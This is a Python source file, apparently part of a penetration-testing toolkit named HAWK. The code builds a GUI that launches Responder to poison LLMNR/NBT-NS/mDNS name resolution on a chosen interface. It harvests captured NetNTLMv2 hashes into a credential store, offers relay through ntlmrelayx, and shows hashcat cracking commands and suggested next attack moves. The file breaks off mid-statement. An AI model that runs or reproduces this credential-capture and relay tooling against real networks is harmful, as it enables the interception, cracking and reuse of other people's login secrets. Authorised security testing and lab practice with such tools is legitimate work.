# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Kill Chain Card Widget v1.0
- Port-aware routing for all tools
- Hydra: wordlist dropdown from metasploit/seclists + browse
- MSF card: check DB + guide user
- Nmap custom: free command field
- Right-click context menu on all entries
- smbclient/crackmapexec → auto-populate intel
- ssh_banner/ftp_anon port-aware fix
- No popup for 0 ports found
- WinRM excluded from HTTP tools
"""

import customtkinter as ctk
import tkinter as tk
import os
import re
import glob
import time
import subprocess
import threading
import shlex
import json
import zipfile
import tempfile
import shutil
import socket
import random
import string
import uuid
from datetime import datetime
from pathlib import Path

from utils.runner import ToolRunner, MultiRunner, MetasploitRunner, GreenBoneRunner
from utils.session import Credential
from gui.widgets.card_common import *

class CardResponderRoutesMixin:
    def _route_responder(self, tool):
        """Interface picker + port-conflict precheck.

        Responder typically exits with code 1 for one of three reasons:
          1. wrong interface (eth0 when the machine has wlan0/ens33/tun0)
          2. port 445 or 139 is already owned by smbd  (conflict)
          3. port 80 is already owned by apache2       (if -w/WPAD is used)
        This dialog surfaces the live interface list, runs a fast socket
        probe on the contested ports, and builds the command with the
        user-chosen interface + flag set.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                  _btn_row, _btn, _safe_destroy)

        # 1. Enumerate interfaces via `ip -o link show`. Fallback to
        #    common Kali names if the command doesn't exist (unlikely).
        interfaces = self._list_network_interfaces()
        if not interfaces:
            interfaces = ["eth0", "tun0", "wlan0"]

        # 2. Pick a smart default:
        #      tun0 first  (HTB/THM VPN — most common HAWK use-case)
        #      then eth0 / ens* / enp*
        default_iface = next(
            (i for i in interfaces if i.startswith("tun")),
            next((i for i in interfaces if i.startswith(("eth", "ens", "enp"))),
                 interfaces[0]))

        # 3. Port-conflict probe (non-blocking, ~100ms). Returns list of
        #    (port, process) that would collide with Responder.
        conflicts = self._responder_port_conflicts()

        win = _make_win(self, "Responder — Poisoning Setup", 640, 540)
        _title(win, "RESPONDER  —  Poisoning Setup")
        _sub(win, "LLMNR / NBT-NS / mDNS poisoner — captures NetNTLMv2.")

        # Why it usually fails
        _note_box(win,
                  "Responder exits with code 1 when:\n"
                  "  • the interface doesn't exist on this host\n"
                  "  • ports 445/139 are held by smbd (Samba)\n"
                  "  • port 80 is held by apache2 (WPAD conflict)\n\n"
                  "Pick the right interface below and clear any conflicts.",
                  COLORS["text_dim"])

        # Interface picker
        ctk.CTkLabel(win, text="Interface:", font=_f("sm", True),
                     text_color=COLORS["text_green"]
                     ).pack(anchor="w", padx=26, pady=(6, 0))
        iface_var = ctk.StringVar(value=default_iface)
        iface_menu = ctk.CTkOptionMenu(
            win, values=interfaces, variable=iface_var,
            width=200, height=28, font=_f("md"),
            fg_color=COLORS["bg_card"],
            button_color=COLORS["border_dim"],
            dropdown_fg_color=COLORS["bg_card"],
            dropdown_text_color=COLORS["text_bright"],
            text_color=COLORS["text_bright"], corner_radius=3)
        iface_menu.pack(anchor="w", padx=26, pady=(2, 6))

        # Conflict display
        if conflicts:
            txt = "⚠  Port conflicts detected:\n" + "\n".join(
                f"  • port {p:<4} → {proc}" for p, proc in conflicts)
            txt += ("\n\nFix before running:\n"
                    "  sudo systemctl stop smbd nmbd apache2 2>/dev/null")
            _note_box(win, txt, COLORS["text_yellow"])
        else:
            _note_box(win, "✓ No port conflicts detected on 139/445/80/53.",
                      COLORS["border_green"])

        # Flag toggles
        flag_frame = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                                   border_color=COLORS["border_dim"],
                                   border_width=1, corner_radius=4)
        flag_frame.pack(fill="x", padx=24, pady=(6, 4))
        ctk.CTkLabel(flag_frame, text="OPTIONS",
                     font=_f("sm", True),
                     text_color=COLORS["text_green"]
                     ).pack(anchor="w", padx=10, pady=(6, 2))

        # Responder 3.1+ refuses to run with BOTH -w (WPAD server) and
        # -P (Proxy_Auth) simultaneously — they would bind the same
        # underlying listener.  We default to -w (the classic LLMNR/NBT-
        # NS → NTLMv2 capture flow works off this) and wire up mutual
        # exclusion between the two checkboxes below.
        wpad_var    = ctk.BooleanVar(value=True)
        force_var   = ctk.BooleanVar(value=False)
        analyze_var = ctk.BooleanVar(value=False)
        verbose_var = ctk.BooleanVar(value=True)

        def _exclude_force(*_):
            """If user ticks -w, untick -P (and vice versa)."""
            if wpad_var.get() and force_var.get():
                force_var.set(False)
        def _exclude_wpad(*_):
            if force_var.get() and wpad_var.get():
                wpad_var.set(False)
        wpad_var.trace_add("write", _exclude_force)
        force_var.trace_add("write", _exclude_wpad)

        for var, flag, hint in [
            (wpad_var,    "-w",
             "serve rogue WPAD (needs port 80 free)  —  MUTUALLY EXCLUSIVE with -P"),
            (force_var,   "-P",
             "force NTLM/Basic auth on proxy        —  MUTUALLY EXCLUSIVE with -w"),
            (analyze_var, "-A",
             "analyze-only — DO NOT poison, just watch"),
            (verbose_var, "-v",
             "verbose output"),
        ]:
            row_f = ctk.CTkFrame(flag_frame, fg_color="transparent")
            row_f.pack(fill="x", padx=10, pady=1)
            ctk.CTkCheckBox(
                row_f, text=flag, variable=var,
                font=_f("sm"), width=60,
                text_color=COLORS["text_bright"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
                hover_color=COLORS["bg_card_hover"],
            ).pack(side="left")
            ctk.CTkLabel(row_f, text=hint, font=_f("xs"),
                         text_color=COLORS["text_dim"]
                         ).pack(side="left", padx=6)
        ctk.CTkFrame(flag_frame, fg_color="transparent", height=4
                     ).pack()

        # Command preview
        preview_lbl = ctk.CTkLabel(
            win, text="", font=_f("sm"),
            text_color=COLORS["text_green"],
            wraplength=580, justify="left", anchor="w")
        preview_lbl.pack(anchor="w", fill="x", padx=26, pady=(4, 6))

        def _build() -> str:
            flags = "-d"   # dhcp is always on
            if wpad_var.get():    flags += "w"
            if force_var.get():   flags += "P"
            if verbose_var.get(): flags += "v"
            parts = ["sudo", "responder", "-I", iface_var.get(), flags]
            if analyze_var.get():
                parts.append("-A")
            return " ".join(parts)

        def _preview(*_):
            preview_lbl.configure(text=f"$ {_build()}")
        for v in (iface_var, wpad_var, force_var, analyze_var, verbose_var):
            v.trace_add("write", _preview)
        _preview()

        # Helpful: run a conflict-clearing command in-place
        def _kill_conflicts():
            self.app.terminal.section("RESPONDER  ·  Clearing port conflicts")
            self._run_raw(tool,
                "sudo systemctl stop smbd nmbd apache2 2>/dev/null; "
                "echo '[+] Stopped smbd/nmbd/apache2 (if running).'")

        def _run():
            _safe_destroy(win)
            # Responder is a long-running, interactive, TTY-requiring tool:
            #   - sudo needs a terminal to prompt for password
            #   - responder prints live captures we want the user to watch
            #   - the user stops it with Ctrl-C when they've got enough hashes
            # Running it via the embedded subprocess runner (_run_raw) fails
            # instantly with exit code 1 because there's no TTY for sudo.
            # Open an xterm for the interactive part, AND start a watcher
            # thread that tails /usr/share/responder/logs/ so HAWK gets
            # live counters, captured hashes auto-pushed to the Credential
            # Store, and a post-stop summary with relay/crack next-steps.
            from utils.runner import _open_terminal
            cmd = _build()
            banner = (
                "echo ''; "
                "echo '╔═══════════════════════════════════════════════════════════╗'; "
                "echo '║  HAWK  —  Responder  (LLMNR / NBT-NS / mDNS poisoner)     ║'; "
                "echo '╚═══════════════════════════════════════════════════════════╝'; "
                "echo ''; "
                "echo 'Responder runs until you press Ctrl-C in this xterm'; "
                "echo '(or click STOP in the HAWK live dialog).'; "
                "echo ''; "
                "echo 'HAWK is watching the session log + hash files.'; "
                "echo 'Captured NTLMv2 hashes auto-populate the'; "
                "echo 'Credential Store → AD RESULTS section in real time.'; "
                "echo ''; "
                f"echo '$ {cmd}'; "
                "echo ''; "
            )
            script = (
                banner
                + cmd
                + "; echo ''; echo '[HAWK] Responder stopped.'"
                  "; read -p 'Press ENTER to close this window...'"
            )
            _open_terminal("HAWK — Responder", script)
            self.app.terminal.section("EXPLOITATION  ·  RESPONDER")
            self.app.terminal.write(f"  $ {cmd}", "dim")
            self.app.terminal.write(
                "  [+] Responder launched in xterm. HAWK live dialog "
                "is following the capture stream — hashes auto-push "
                "to the Credential Store.", "info")

            # ── Spin up the watcher + live dialog ──────────────────
            # Slight delay so responder has a chance to create the
            # session log / hash directory before the watcher inits
            # its offsets (avoids a first-tick race).
            self.after(800, lambda:
                       self._start_responder_live_session(tool, cmd))

            # ── Early-death check ─────────────────────────────────
            # Responder runs in xterm so HAWK never sees its stderr.
            # If it crashes on startup (wrong interface, port clash)
            # the user only notices in the xterm behind the dialog.
            # After 3s, verify the process is still alive and warn.
            def _check_responder_alive():
                import subprocess as _sp
                try:
                    r = _sp.run(
                        ["pgrep", "-f", r"python.*[Rr]esponder\.py"],
                        capture_output=True, text=True, timeout=3)
                    if not r.stdout.strip():
                        self.app.terminal.write(
                            "  [!] Responder process not found — it may "
                            "have crashed on startup. Check the xterm "
                            "window for error details.", "error")
                except Exception:
                    pass
            self.after(3000, _check_responder_alive)

        row = _btn_row(win)
        _btn(row, "RUN RESPONDER", _run, primary=True, w=160)
        if conflicts:
            _btn(row, "CLEAR CONFLICTS", _kill_conflicts, warn=True, w=170)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _list_network_interfaces(self) -> list:
        """Return up list of non-loopback interface names via `ip -o link`."""
        import subprocess
        try:
            r = subprocess.run(["ip", "-o", "link", "show"],
                               capture_output=True, text=True, timeout=3)
            out = []
            for line in r.stdout.splitlines():
                # Format: "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ..."
                parts = line.split(":", 2)
                if len(parts) < 3:
                    continue
                name = parts[1].strip().split("@")[0]
                if name and name != "lo":
                    out.append(name)
            return out
        except Exception as e:
            print(f"[HAWK] _list_network_interfaces failed: {e}")
            return []

    def _responder_port_conflicts(self) -> list:
        """Probe 139/445/80/53 locally. Returns [(port, process_hint)]."""
        import socket, subprocess
        conflicts = []
        for port, typical in [(139, "smbd/samba"),
                               (445, "smbd/samba"),
                               (80,  "apache2/nginx"),
                               (53,  "systemd-resolved/dnsmasq")]:
            # Try to bind briefly to 0.0.0.0:port. If EADDRINUSE → conflict.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
            try:
                s.bind(("0.0.0.0", port))
            except OSError:
                # Try to resolve the actual process name via ss.
                proc = typical
                try:
                    r = subprocess.run(
                        ["ss", "-tlnp", f"sport = :{port}"],
                        capture_output=True, text=True, timeout=2)
                    for ln in r.stdout.splitlines():
                        if f":{port}" in ln and "users:" in ln:
                            # users:(("smbd",pid=1234,fd=35))
                            import re as _re
                            m = _re.search(r'"([^"]+)"', ln)
                            if m:
                                proc = m.group(1)
                                break
                except Exception:
                    pass
                conflicts.append((port, proc))
            finally:
                try: s.close()
                except Exception: pass
        return conflicts

    def _start_responder_live_session(self, tool, cmd: str):
        """Spin up the ResponderWatcher + open the live-status dialog.

        Called ~800ms after the xterm launched responder.  We pause
        first so responder has time to create Responder-Session.log
        (and its owning directory, on first run) — otherwise the
        watcher starts with stale offsets and misses the first bursts
        of captures.
        """
        try:
            from utils.responder import ResponderWatcher
        except Exception as e:
            self.app.terminal.write(
                f"  [!] responder watcher import failed: {e}",
                "error")
            return

        # State container — the live dialog mutates the same dict the
        # watcher fills, so we don't need a pub-sub bus.
        state = {
            "counters":       {},
            "unique_names":   {"LLMNR": [], "NBT-NS": [], "MDNS": []},
            "victims":        [],
            "hashes":         [],
            "started_at":     time.time(),
            "cmd":            cmd,
            "dialog":         None,
        }

        def _on_update(counters, unique_names, victims):
            state["counters"] = counters
            state["unique_names"] = unique_names
            state["victims"] = victims
            # Live dialog refresh (only when it's still open).
            d = state.get("dialog")
            if d is not None:
                try:
                    d._refresh()
                except Exception:
                    pass

        def _on_hash(entry):
            # Called on the Tk main thread — safe to touch the store.
            state["hashes"].append(entry)
            self._responder_push_hash_to_store(entry)
            # Also nudge the live dialog counters.
            d = state.get("dialog")
            if d is not None:
                try:
                    d._refresh()
                except Exception:
                    pass

        watcher = ResponderWatcher(
            self.app, on_update=_on_update, on_hash=_on_hash)
        watcher.start()
        self._responder_watcher = watcher
        self._responder_state = state

        # Open the live dialog.
        self._show_responder_live_dialog(tool, state, watcher)

    def _responder_push_hash_to_store(self, entry: dict):
        """Auto-push a captured NTLMv2 hash to the Credential Store
        (AD RESULTS section).  Called on the UI thread."""
        try:
            sess = self.app.session_manager.current
            if sess is None:
                return
            from utils.session import Credential
            from utils.run_id import TOOL_RUN_CATEGORY, new_run_id

            raw = entry.get("raw", "")
            user = entry.get("user", "") or "?"
            domain = entry.get("domain", "") or ""
            # Protocol source (SMB / HTTP) from the filename.
            src_file = entry.get("source_file", "")
            src = os.path.basename(src_file)
            if src.startswith("SMB"):
                svc = ["SMB"]
            elif src.startswith("HTTP"):
                svc = ["HTTP"]
            else:
                svc = ["SMB", "HTTP"]

            cred = Credential(
                username=user,
                password="",
                hash_val=raw,
                hash_type="NetNTLMv2",
                cred_type="hash",
                services=svc,
                source_phase=self.phase_id,
                host=domain or "(responder capture)",
                notes=(f"NTLMv2 hash captured by Responder "
                       f"({src}).\n"
                       f"Crack:  hashcat -m 5600 <file> "
                       f"/usr/share/wordlists/rockyou.txt\n"
                       f"Relay:  impacket-ntlmrelayx -t <target> "
                       f"-smb2support  (see RELAY LIVE button in the "
                       f"Responder live dialog)"),
                linked_run_id=new_run_id(),
                category=TOOL_RUN_CATEGORY,
                # A Responder capture is a challenge/response blob:
                # never cracked, never authenticated by us.  It only
                # becomes verified if the crack path recovers the
                # plaintext.
                verified=False)
            sess.add_credential(cred)
            sess.save()
            # Refresh Credential Store UI if available.  Route through
            # mark_captured so the new row is HIGHLIGHTED (not just the tab
            # counter) — a Responder capture is pushed straight onto the
            # session, bypassing the widget's own new-row marking (MSF3 B4.4).
            cs = getattr(self.app, "cred_store", None)
            if cs:
                if hasattr(cs, "mark_captured"):
                    cs.mark_captured(cred)
                else:
                    cs.refresh()
            self.app.terminal.write(
                f"  [+] Responder captured NTLMv2 for "
                f"{user}@{domain or '(no-domain)'} → Credential "
                f"Store (AD RESULTS).", "success")
        except Exception as e:
            print(f"[HAWK] responder hash push failed: {e}")

    def _show_responder_live_dialog(self, tool, state, watcher):
        """Live status dialog — counters update every second while
        responder runs.  Has STOP / RELAY / CLOSE buttons.

        CLOSE just hides the dialog; the watcher keeps running in
        the background and hashes continue auto-pushing.  STOP
        actually SIGINTs responder and opens the post-stop summary.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)

        win = _make_win(self, "Responder — LIVE", 820, 720)
        _title(win, "RESPONDER — LIVE CAPTURE")
        _sub(win, f"$ {state['cmd']}", COLORS["text_dim"])

        # Smart-filter toggle — hides IoT mDNS noise from the unique-
        # names panel (always accurate in counters either way).
        hide_noise_var = ctk.BooleanVar(value=True)

        _outer = win
        body = ctk.CTkScrollableFrame(
            _outer, fg_color="transparent",
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        body.pack(fill="both", expand=True, padx=0, pady=(0, 2))

        # ── Counters grid ───────────────────────────────────────────
        counters_frame = ctk.CTkFrame(
            body, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_green"],
            border_width=2, corner_radius=4)
        counters_frame.pack(fill="x", padx=14, pady=(8, 6))

        # Big "NTLMv2 captured" counter, centred.
        ntlm_lbl = ctk.CTkLabel(
            counters_frame, text="NTLMv2 CAPTURED:  0",
            font=_f("xxl", True),
            text_color=COLORS["text_green"],
            anchor="center")
        ntlm_lbl.pack(fill="x", padx=12, pady=(10, 4))

        rate_lbl = ctk.CTkLabel(
            counters_frame, text="(tick to update…)",
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="center")
        rate_lbl.pack(fill="x", padx=12, pady=(0, 8))

        # 3-column mini grid for protocol counters.
        sub_grid = ctk.CTkFrame(counters_frame, fg_color="transparent")
        sub_grid.pack(fill="x", padx=12, pady=(0, 8))
        for i in range(4):
            sub_grid.grid_columnconfigure(i, weight=1)

        mini_labels = {}

        def _mini(row, col, title, color):
            f = ctk.CTkFrame(
                sub_grid, fg_color=COLORS["bg_primary"],
                border_color=COLORS["border_dim"],
                border_width=1, corner_radius=3)
            f.grid(row=row, column=col, sticky="ew", padx=4, pady=3)
            ctk.CTkLabel(
                f, text=title, font=_f("xs"),
                text_color=COLORS["text_dim"],
                anchor="center"
            ).pack(fill="x", padx=4, pady=(4, 0))
            val_lbl = ctk.CTkLabel(
                f, text="0", font=_f("xl", True),
                text_color=color, anchor="center")
            val_lbl.pack(fill="x", padx=4, pady=(0, 4))
            mini_labels[title] = val_lbl

        _mini(0, 0, "LLMNR",    COLORS["text_cyan"])
        _mini(0, 1, "NBT-NS",   COLORS["text_cyan"])
        _mini(0, 2, "MDNS",     COLORS["text_dim"])
        _mini(0, 3, "wpad",     COLORS["text_yellow"])
        _mini(1, 0, "HTTP",     COLORS["text_yellow"])
        _mini(1, 1, "SMB",      COLORS["text_yellow"])
        _mini(1, 2, "Victims",  COLORS["text_bright"])
        _mini(1, 3, "Elapsed",  COLORS["text_dim"])

        # ── Filter checkbox + unique-names panel ────────────────────
        ctrl_row = ctk.CTkFrame(body, fg_color="transparent")
        ctrl_row.pack(fill="x", padx=14, pady=(6, 2))
        ctk.CTkCheckBox(
            ctrl_row,
            text="Hide IoT mDNS noise (Android TV, AirPlay, printers …)",
            variable=hide_noise_var, font=_f("sm"),
            text_color=COLORS["text_dim"],
            fg_color=COLORS["border_green"],
            border_color=COLORS["border_dim"],
            checkmark_color=COLORS["bg_primary"],
        ).pack(side="left")

        ctk.CTkLabel(
            body, text="  ◇  UNIQUE NAMES QUERIED",
            font=_f("md", True), text_color=COLORS["text_bright"],
            anchor="w",
        ).pack(fill="x", padx=24, pady=(10, 2))

        names_box = ctk.CTkTextbox(
            body, height=180, font=_f("sm"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3, wrap="word")
        names_box.pack(fill="x", padx=14, pady=(0, 6))

        # ── Latest captured hashes panel ────────────────────────────
        ctk.CTkLabel(
            body, text="  ◇  LATEST CAPTURED NTLMv2",
            font=_f("md", True), text_color=COLORS["text_green"],
            anchor="w",
        ).pack(fill="x", padx=24, pady=(10, 2))

        hashes_box = ctk.CTkTextbox(
            body, height=140, font=_f("sm"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_green"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3, wrap="word")
        hashes_box.pack(fill="x", padx=14, pady=(0, 6))

        # ── Refresh routine — called from watcher callbacks ────────
        def _refresh():
            try:
                c = state.get("counters") or {}
                h = state.get("hashes") or []
                un = state.get("unique_names") or {}
                vic = state.get("victims") or []

                ntlm_lbl.configure(
                    text=f"NTLMv2 CAPTURED:  {c.get('NTLMv2', 0)}")
                # "Rate" = captures in last minute approx
                elapsed = max(1, int(time.time()
                                     - state.get("started_at",
                                                  time.time())))
                rate_lbl.configure(
                    text=f"elapsed: {elapsed}s  ·  "
                         f"{len(h)} unique users")

                def _set(lbl, val):
                    if lbl in mini_labels:
                        mini_labels[lbl].configure(text=str(val))
                _set("LLMNR",   c.get("LLMNR", 0))
                _set("NBT-NS",  c.get("NBT-NS", 0))
                noise_delta = c.get("MDNS_noise", 0)
                _set("MDNS",    f"{c.get('MDNS', 0)}"
                                + (f"  ({noise_delta} noise)"
                                   if noise_delta else ""))
                _set("wpad",    c.get("wpad", 0))
                _set("HTTP",    c.get("HTTP", 0))
                _set("SMB",     c.get("SMB", 0))
                _set("Victims", len(vic))
                _set("Elapsed", f"{elapsed}s")

                # Unique names
                lines = []
                for proto in ("LLMNR", "NBT-NS", "MDNS"):
                    entries = un.get(proto) or []
                    if hide_noise_var.get() and proto == "MDNS":
                        # MDNS always noise-stripped in the watcher's
                        # unique_names bucket, but the checkbox lets
                        # the user hide the whole MDNS block too.
                        continue
                    if not entries:
                        continue
                    lines.append(f"[{proto}]  ({len(entries)} unique):")
                    for name, cnt in entries[:12]:
                        lines.append(f"    {cnt:>3}×  {name[:72]}")
                    lines.append("")
                names_box.configure(state="normal")
                names_box.delete("1.0", "end")
                names_box.insert("1.0",
                                  "\n".join(lines) if lines
                                  else "(waiting for queries…)")
                names_box.configure(state="disabled")

                # Latest hashes
                hlines = []
                for entry in h[-8:]:
                    hlines.append(
                        f"{entry['user']}::{entry['domain']}  "
                        f"[{os.path.basename(entry['source_file'])}]")
                    hlines.append(f"  {entry['raw'][:100]}…")
                hashes_box.configure(state="normal")
                hashes_box.delete("1.0", "end")
                hashes_box.insert("1.0",
                                   "\n".join(hlines) if hlines
                                   else "(no NTLMv2 hashes captured "
                                         "yet — waiting for victims "
                                         "to authenticate)")
                hashes_box.configure(state="disabled")
            except Exception as e:
                print(f"[HAWK] responder dialog refresh: {e}")

        # Stash the refresh routine on the dialog so the watcher
        # callback can invoke it without closures.
        win._refresh = _refresh
        state["dialog"] = win
        hide_noise_var.trace_add("write", lambda *_: _refresh())
        _refresh()

        # ── Footer buttons ──────────────────────────────────────────
        win = _outer

        def _do_stop():
            """Stop responder and show the post-stop summary.

            The kill runs OFF the UI thread: confirming the root poisoner is
            dead escalates SIGINT->SIGKILL with a privileged prompt and a
            pgrep re-check, which would otherwise freeze HAWK.  The summary
            opens immediately; the kill's honest outcome is reported to the
            terminal when it finishes (and warns if the poisoner survived).
            """
            from utils.responder import stop_responder_process
            watcher.stop()
            state["dialog"] = None
            _safe_destroy(win)
            self._show_responder_post_stop_dialog(tool, state)
            # Clear weak refs
            self._responder_watcher = None
            self._responder_state = None

            def _kill_worker():
                ok = stop_responder_process()

                def _report():
                    if ok:
                        self.app.terminal.write(
                            "  [+] Responder stopped — confirmed no process "
                            "remains.", "success")
                    else:
                        self.app.terminal.write(
                            "  [!] Responder may STILL be running — HAWK "
                            "could not confirm it stopped (needs root). "
                            "Kill it manually:  sudo pkill -9 -f "
                            "Responder.py", "error")
                disp = getattr(self.app, "ui_call", None)
                disp(_report) if disp else _report()

            import threading as _th
            _th.Thread(target=_kill_worker, daemon=True).start()

        def _do_relay():
            self._show_ntlmrelayx_launcher(tool, state)

        def _do_close_only():
            self._push_responder_finding(state)
            state["dialog"] = None
            _safe_destroy(win)
            # Watcher keeps running — hashes still auto-push.  The
            # user can re-open via the card's LIVE STATUS button if
            # we add one (future).

        row = _btn_row(win)
        _btn(row, "STOP + SUMMARY", _do_stop, danger=True, w=180)
        _btn(row, "RELAY LIVE (ntlmrelayx)", _do_relay,
             primary=True, w=220)
        _btn(row, "CLOSE (keep watching)", _do_close_only, w=200)

    def _push_responder_finding(self, state):
        """Push (or replace) the Responder Target Intel finding.

        Safe to call multiple times — replace=True ensures exactly one
        finding.  Called from STOP and CLOSE so the finding is never
        lost regardless of how the session ends.
        """
        try:
            counters = state.get("counters") or {}
            unique_names = state.get("unique_names") or {}
            victims = state.get("victims") or []
            elapsed = int(time.time() - state.get("started_at",
                                                   time.time()))
            from utils.run_id import new_run_id
            desc_lines = [
                f"Responder session — {elapsed}s",
                "",
                f"  NTLMv2 hashes captured : {counters.get('NTLMv2', 0)}",
                f"  LLMNR poisoned         : {counters.get('LLMNR', 0)}",
                f"  NBT-NS poisoned        : {counters.get('NBT-NS', 0)}",
                f"  MDNS poisoned          : {counters.get('MDNS', 0)}"
                f"  ({counters.get('MDNS_noise', 0)} IoT noise)",
                f"  HTTP auth events       : {counters.get('HTTP', 0)}",
                f"  SMB auth events        : {counters.get('SMB', 0)}",
                f"  WPAD files served      : {counters.get('wpad', 0)}",
                f"  Unique victim IPs      : {len(victims)}",
            ]
            for proto in ("LLMNR", "NBT-NS"):
                entries = unique_names.get(proto) or []
                if not entries:
                    continue
                desc_lines.append("")
                desc_lines.append(
                    f"Top {proto} names queried "
                    f"(these are potential LAN targets):")
                for name, cnt in entries[:15]:
                    desc_lines.append(f"  {cnt:>3}×  {name}")

            sev = ("high" if counters.get("NTLMv2", 0) > 0 else
                   "medium" if (counters.get("LLMNR", 0)
                                + counters.get("NBT-NS", 0) > 0)
                   else "info")
            self.app.target_intel.remove_auto_findings_by_source(
                "Responder")
            self.app.target_intel.add_auto_finding(
                title="RESPONDER — LLMNR/NBT-NS poisoning session",
                description="\n".join(desc_lines),
                severity=sev, source="Responder",
                linked_run_id=new_run_id(), replace=True)
        except Exception as e:
            self.app.terminal.write(
                f"  [!] Responder finding push failed: {e}", "warn")

    def _show_responder_post_stop_dialog(self, tool, state):
        """Summary shown after the user stops Responder.

        Totals, unique queried names, captured hashes with actionable
        buttons, and a pushed Target Intel finding with the top names.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy,
                                 _selectable_text)

        counters = state.get("counters") or {}
        hashes = state.get("hashes") or []
        unique_names = state.get("unique_names") or {}
        victims = state.get("victims") or []
        elapsed = int(time.time() - state.get("started_at", time.time()))

        self._push_responder_finding(state)

        # Dialog
        win = _make_win(self, "Responder — stopped", 780, 720)
        _title(win, "RESPONDER — session stopped")
        _sub(win, f"elapsed: {elapsed}s  ·  "
                  f"{counters.get('NTLMv2', 0)} NTLMv2 captured",
             COLORS["text_dim"])

        _outer = win
        body = ctk.CTkScrollableFrame(
            _outer, fg_color="transparent",
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        body.pack(fill="both", expand=True, padx=0, pady=(0, 2))

        # Totals
        totals = "\n".join([
            f"  NTLMv2 hashes captured   : "
            f"{counters.get('NTLMv2', 0)}",
            f"  LLMNR poisoned           : "
            f"{counters.get('LLMNR', 0)}",
            f"  NBT-NS poisoned          : "
            f"{counters.get('NBT-NS', 0)}",
            f"  MDNS poisoned (filtered) : "
            f"{counters.get('MDNS', 0)}  "
            f"({counters.get('MDNS_noise', 0)} IoT noise)",
            f"  HTTP auth events         : "
            f"{counters.get('HTTP', 0)}",
            f"  SMB auth events          : "
            f"{counters.get('SMB', 0)}",
            f"  WPAD files served        : "
            f"{counters.get('wpad', 0)}",
            f"  Unique victims           : {len(victims)}",
        ])
        _note_box(body, totals,
                  color=(COLORS["border_green"]
                         if counters.get("NTLMv2", 0) > 0
                         else COLORS["border_dim"]),
                  selectable=True)

        # Captured hashes
        ctk.CTkLabel(
            body, text="  ◇  CAPTURED NTLMv2 HASHES",
            font=_f("md", True), text_color=COLORS["text_green"],
            anchor="w",
        ).pack(fill="x", padx=24, pady=(12, 2))

        if not hashes:
            _note_box(body,
                      "No NTLMv2 hashes captured in this session.\n"
                      "\n"
                      "Possible reasons:\n"
                      "  · No real user / process triggered name "
                      "resolution for a fake name\n"
                      "  · Target subnet has LLMNR/NBT-NS disabled "
                      "by GPO (modern AD default)\n"
                      "  · Run longer — captures come when someone "
                      "opens Explorer \\\\typo\n"
                      "  · Try -A (analyze mode) to see who would "
                      "respond, OR use ntlmrelayx directly against "
                      "a known SMB signing-off target",
                      COLORS["border_dim"])
        else:
            for entry in hashes:
                ef = ctk.CTkFrame(
                    body, fg_color=COLORS["bg_card"],
                    border_color=COLORS["border_green"],
                    border_width=1, corner_radius=3)
                ef.pack(fill="x", padx=24, pady=3)
                ctk.CTkLabel(
                    ef,
                    text=(f"  {entry['user']}"
                          + (f"::{entry['domain']}"
                             if entry['domain'] else "")
                          + f"   ["
                          + os.path.basename(
                              entry['source_file']) + "]"),
                    font=_f("md", True),
                    text_color=COLORS["text_green"],
                    anchor="w",
                ).pack(fill="x", padx=8, pady=(4, 2))
                # Truncated hash preview (full thing is in the
                # Credential Store already).
                ctk.CTkLabel(
                    ef, text=f"  {entry['raw'][:110]}…",
                    font=_f("sm"), text_color=COLORS["text_dim"],
                    anchor="w", wraplength=700, justify="left",
                ).pack(fill="x", padx=8, pady=(0, 6))

        # Top names queried
        for proto in ("LLMNR", "NBT-NS"):
            entries = unique_names.get(proto) or []
            if not entries:
                continue
            ctk.CTkLabel(
                body,
                text=f"  ◇  TOP {proto} NAMES QUERIED "
                     f"({len(entries)} unique)",
                font=_f("md", True), text_color=COLORS["text_cyan"],
                anchor="w",
            ).pack(fill="x", padx=24, pady=(12, 2))
            txt = "\n".join(
                f"  {cnt:>3}×  {name}"
                for name, cnt in entries[:15])
            _note_box(body, txt, COLORS["border_dim"],
                      selectable=True)

        # Next-moves hint
        ctk.CTkLabel(
            body, text="  ◇  NEXT MOVES",
            font=_f("md", True), text_color=COLORS["text_yellow"],
            anchor="w",
        ).pack(fill="x", padx=24, pady=(12, 2))

        next_moves = []
        if counters.get("NTLMv2", 0) > 0:
            next_moves.append(
                "  · Hashes are in Credential Store → AD RESULTS.  "
                "Use CRACK row button (hashcat -m 5600) or fire "
                "RELAY LIVE below.")
        else:
            next_moves.append(
                "  · No hashes — don't give up; long sessions "
                "eventually catch someone.  Also try -A (analyze "
                "mode) to map who talks LLMNR/NBT-NS.")
        if unique_names.get("LLMNR") or unique_names.get("NBT-NS"):
            next_moves.append(
                "  · Queried names above are REAL targets on the "
                "LAN — they have clients looking for them.  Add "
                "them to nxc / bloodhound scope.")
        if counters.get("wpad", 0) > 0:
            next_moves.append(
                "  · WPAD requests happened — re-run with -wv and "
                "port 80 free, a browser may NTLM-auth next time.")
        _note_box(body,
                  "\n".join(next_moves) or
                  "  · Re-run with different flags or longer.",
                  COLORS["border_dim"])

        win = _outer
        row = _btn_row(win)
        _btn(row, "RELAY LIVE", lambda:
